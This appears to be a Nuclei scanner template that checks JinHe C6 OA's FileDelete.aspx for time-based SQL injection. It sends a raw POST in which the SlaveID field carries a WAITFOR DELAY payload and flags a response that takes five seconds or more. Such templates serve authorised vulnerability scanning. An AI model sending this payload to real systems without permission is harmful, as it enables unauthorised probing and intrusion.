id: JinHeC6-FileDelete-sqlInjection

info:
  name: JinHeC6-FileDelete-sqlInjection
  author: iSee857
  severity: high
  description: JinHeC6-FileDelete-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /c6/Jhsoft.Web.accept/FileDelete.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
      
        SlaveID=1')WAITFOR/**/DELAY'0:0:5'--/Temp/

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200